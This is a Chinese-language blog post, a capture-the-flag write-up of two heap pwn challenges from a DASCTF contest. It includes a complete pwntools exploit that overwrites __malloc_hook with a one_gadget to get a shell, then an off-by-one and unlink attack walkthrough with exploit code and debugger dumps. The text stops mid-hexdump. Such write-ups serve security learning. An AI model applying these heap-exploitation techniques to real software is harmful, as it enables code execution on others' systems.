<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>winter - 像初雪一样自由洒落</title>
  <meta name="author" content="winter">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="winter - 像初雪一样自由洒落"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-70812759-1', 'auto');
  ga('send', 'pageview');
</script>



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<meta name="generator" content="Hexo 4.2.1"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">winter - 像初雪一样自由洒落</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>winter - 像初雪一样自由洒落<span class="blink-fast">∎</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		Keep and carry on.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/Mar-DASCTF明御攻防赛/" >Mar.DASCTF明御攻防赛</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><blockquote>
<p>思路挺简单的</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>基本上分为四部分。</p>
<ol>
<li>输入要分配的chunk大小，打印chunk地址</li>
<li>输入与分配chunk的偏移，往该地址中输入0x10数据。</li>
<li>malloc(0xA0) =&gt; 很明显是要覆盖__malloc_hook</li>
<li>close(1) =&gt; 关闭输出，所以要重定向（本地就不需要了）</li>
</ol>
</blockquote>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428214311968.png" alt="image-20210428214311968"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
<p>根据程序的四个功能，一步步来做</p>
</blockquote>
<ol>
<li><p>给定chunk大小并打印</p>
<p>可以输入一个很大的chunk（和<a href="https://warm-winter.github.io/2021/04/27/%C2%96gyctf-2020-force/#1-%E5%88%86%E9%85%8D%E5%A4%A7%E5%9D%97" target="_blank" rel="noopener">高校战役force</a>的第一步操作类似），泄露的块地址和libc_base偏移固定，故可以得到libc_base</p>
</li>
<li><p>输入偏移，输入数据</p>
<ol>
<li><p>偏移计算</p>
<ul>
<li><p>由功能3可以明确知道，是要覆盖__malloc_hook</p>
</li>
<li><p>由功能1得到了libc_base，可以计算__malloc_hook的地址</p>
</li>
<li><p>故可以利用<code>__malloc_hook地址 - chunk地址 = offset</code></p>
</li>
</ul>
</li>
<li><p>数据</p>
<ul>
<li>输入one_gadget地址即可</li>
<li>本地不需要调整栈帧，直接发送one_gadget即可</li>
</ul>
</li>
</ol>
</li>
<li><p>malloc(0xA0)</p>
<p>即可get shell</p>
</li>
<li><p>close(1) [本地不需要]</p>
<p>需要输出重定向</p>
<p><code>&quot;exec 1&gt;&amp;0&quot;</code></p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>保护全开，libc是2.27的</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;mar&#x2F;fruitpie$ strings libc.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.</span><br><span class="line">Compiled by GNU CC version 7.5.0.</span><br></pre></td></tr></table></figure>

<h4 id="1-分配大块，计算libc-base"><a href="#1-分配大块，计算libc-base" class="headerlink" title="1.分配大块，计算libc_base"></a>1.分配大块，计算libc_base</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0x8 bytes:</span><br><span class="line">    &#39;1048576\n&#39;</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    &#39;0x7f06e5785010\n&#39;</span><br><span class="line">    &#39;Offset:\n&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x55d2669e0000     0x55d2669e2000 r-xp     2000 0      &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266be1000     0x55d266be2000 r--p     1000 1000   &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266be2000     0x55d266be3000 rw-p     1000 2000   &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;fruitpie</span><br><span class="line">    0x55d266c68000     0x55d266c89000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7f06e526e000     0x7f06e5455000 r-xp   1e7000 0      &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5455000     0x7f06e5655000 ---p   200000 1e7000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5655000     0x7f06e5659000 r--p     4000 1e7000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e5659000     0x7f06e565b000 rw-p     2000 1eb000 &#x2F;home&#x2F;winter&#x2F;mar&#x2F;fruitpie&#x2F;libc.so.6</span><br><span class="line">    0x7f06e565b000     0x7f06e565f000 rw-p     4000 0      </span><br><span class="line">    0x7f06e565f000     0x7f06e5688000 r-xp    29000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e5785000     0x7f06e5888000 rw-p   103000 0      </span><br><span class="line">    0x7f06e5888000     0x7f06e5889000 r--p     1000 29000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e5889000     0x7f06e588a000 rw-p     1000 2a000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7f06e588a000     0x7f06e588b000 rw-p     1000 0      </span><br><span class="line">    0x7ffe87583000     0x7ffe875a4000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7ffe875bd000     0x7ffe875c0000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffe875c0000     0x7ffe875c2000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>

<p><code>0x7f06e5785010 - 0x7f06e526e000 = 0x517010</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1048576</span>))</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">chunk_base = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(chunk_base))</span><br><span class="line"></span><br><span class="line">libc_base = chunk_base - <span class="number">0x517010</span></span><br><span class="line">log.success(hex(libc_base))</span><br></pre></td></tr></table></figure>

<h4 id="2-计算偏移，发送数据"><a href="#2-计算偏移，发送数据" class="headerlink" title="2.计算偏移，发送数据"></a>2.计算偏移，发送数据</h4><blockquote>
<p>偏移就是<code>offset = malloc_hook - chunk_base</code></p>
<p>数据就是<code>onegadget[1]+libc_base</code></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">offset = malloc_hook - chunk_base</span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">p.sendline(hex(offset))</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x415e6</span>,<span class="number">0x4163a</span>,<span class="number">0xdfac1</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">payload = p64(onegadget[<span class="number">1</span>]+libc_base)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为程序不支持调试，所以需要用支持debug版本的libc才能看得到，，，<del>懒得再整一遍了orz</del></p>
</blockquote>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./fruitpie"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/usr/local/glibc-2.27/lib/libc-2.27.so")</span></span><br><span class="line"><span class="comment"># p = process(["/usr/local/glibc-2.27/lib/ld-2.27.so", "./fruitpie"],</span></span><br><span class="line">            <span class="comment"># env=&#123;"LD_PRELOAD":"/usr/local/glibc-2.27/lib/libc-2.27.so"&#125;)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./fruitpie"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1048576</span>))</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">chunk_base = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(hex(chunk_base))</span><br><span class="line"></span><br><span class="line">libc_base = chunk_base - <span class="number">0x517010</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">offset = malloc_hook - chunk_base</span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">p.sendline(hex(offset))</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x415e6</span>,<span class="number">0x4163a</span>,<span class="number">0xdfac1</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">payload = p64(<span class="number">0x10a45c</span>+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babybabybabyheap"><a href="#babybabybabyheap" class="headerlink" title="babybabybabyheap"></a>babybabybabyheap</h2><blockquote>
<p>2.31的off by one</p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p>由四个功能，其中exit功能中有一个隐藏功能edit</p>
<ol>
<li>程序一开始就送了一个puts的地址，可以计算libc地址</li>
<li>add：根据idx，size，content创建块，其中chunk指针被放入heap_list，长度也存入了size_list</li>
<li>show：根据idx，打印chunk内容</li>
<li>delete：根据size判断是否是否，size_list被置零，不存在uaf</li>
<li>隐藏功能edit：根据idx，修改内容，但是存在off by one</li>
</ol>
<h4 id="puts地址"><a href="#puts地址" class="headerlink" title="puts地址"></a>puts地址</h4><p>ida反汇编并没有看到这个地址，汇编里面可以清楚看到</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513201026622.png" alt="image-20210513201026622"></p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513201127385.png" alt="image-20210513201127385"></p>
<h4 id="隐藏edit功能"><a href="#隐藏edit功能" class="headerlink" title="隐藏edit功能"></a>隐藏edit功能</h4><p>main函数反汇编并不好看，直接汇编更加清楚</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513194930539.png" alt="image-20210513194930539"></p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195209948.png" alt="image-20210513195209948"></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h4><h5 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h5><p>在输入函数中，将最后两位置零</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195310404.png" alt="image-20210513195310404"></p>
<p>add函数中，没有off by one</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195431863.png" alt="image-20210513195431863"></p>
<p>edit函数中，存在off by one</p>
<p><img src="/2021/05/13/Mar-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210513195449902.png" alt="image-20210513195449902"></p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>分配程序，利用off by one，可以将size中代表前面是否释放的1位置零，使得上一个chunk被认为释放，并进行unlink操作。</p>
<p>例如：分配四个块：</p>
<ul>
<li>chunk1 = 0x108（堆块重叠）</li>
<li>chunk2 = 0x118</li>
<li>chunk3 = 0x1f8（0x201（最后0x10是chunk头，0x1表示上一个块未释放））</li>
<li>chunk4 = 0x118（和chunk2相同，为了放在同一链中，chunk2 -&gt; chunk4，修改chunk2中的内容，就可以任意地址申请chunk了）</li>
</ul>
<p>首先在chunk1中伪造一个fake_chunk</p>
<p>通过chunk2可以将chunk3的大小改为0x200，并修改pre_size为chunk1+chunk2，这样，释放chunk3的时候，会以为fake_chunk也被释放，程序会进行unlink操作，合并三个chunk，这样chunk1和chunk2都是used，和fake_chunk中有重叠。</p>
<h3 id="详细过程-1"><a href="#详细过程-1" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息-1"><a href="#0-基本信息-1" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>stripped代表程序去掉了符号表，需要使用debug版本的glibc进行调试</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;mar&#x2F;babybabybabyheap$ file babyheap</span><br><span class="line">babyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;c05390deb68a417f8d87365fd817c6396eca7462, for GNU&#x2F;Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure>

<blockquote>
<p>没开pie和relro，地址固定，并且可以修改got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;ctf$ checksec babyheap </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;ctf&#x2F;babyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>####</p>
<h4 id="1-申请七个块"><a href="#1-申请七个块" class="headerlink" title="1.申请七个块"></a>1.申请七个块</h4><blockquote>
<p>这七个块主要用来填满tcache。但是要在使用的四个chunk申请之后释放，不然会把这七个块中申请过来</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in range(7):</span><br><span class="line">	add(i+2,0x1f8,&#39;winter&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995000</span><br><span class="line">Size: 0x291</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995290</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995490</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995690</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995890</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995a90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995c90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995e90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556996090</span><br><span class="line">Size: 0x1ff71</span><br></pre></td></tr></table></figure>

<h4 id="2-申请使用的四个块"><a href="#2-申请使用的四个块" class="headerlink" title="2.申请使用的四个块"></a>2.申请使用的四个块</h4><blockquote>
<p>在第一个chunk伪造一个chunk，做unlink攻击</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec090</span><br><span class="line">Size: 0x111</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec1a0</span><br><span class="line">Size: 0x121</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec2c0</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec4c0</span><br><span class="line">Size: 0x121</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec5e0</span><br><span class="line">Size: 0x1fa21</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555557ec090</span><br><span class="line">0x5555557ec090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x5555557ec0a0:	0x0000000000000000	0x0000000000000221</span><br><span class="line">0x5555557ec0b0:	0x0000000000404128	0x0000000000404130</span><br><span class="line">0x5555557ec0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557ec0d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="3-释放七个块，填满tcache"><a href="#3-释放七个块，填满tcache" class="headerlink" title="3.释放七个块，填满tcache"></a>3.释放七个块，填满tcache</h4><blockquote>
<p>tcache填满，才会进行unlink，不然直接释放进入tcache中了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x200 [  7]: 0x555555fd6ea0 —▸ 0x555555fd6ca0 —▸ 0x555555fd6aa0 —▸ 0x555555fd68a0 —▸ 0x555555fd66a0 —▸ 0x555555fd64a0 —▸ 0x555555fd62a0 ◂— 0x0</span><br></pre></td></tr></table></figure>

<h4 id="4-off-by-one"><a href="#4-off-by-one" class="headerlink" title="4.off by one"></a>4.off by one</h4><blockquote>
<p>填满chunk2，并修改chunk3的pre_size为伪造chunk大小</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0x220</span>)</span><br><span class="line">edit(<span class="number">15</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x555555adb3a0</span><br><span class="line">0x555555adb3a0:	0x0000000000000000	0x0000000000000121	#chunk2</span><br><span class="line">0x555555adb3b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3c0:	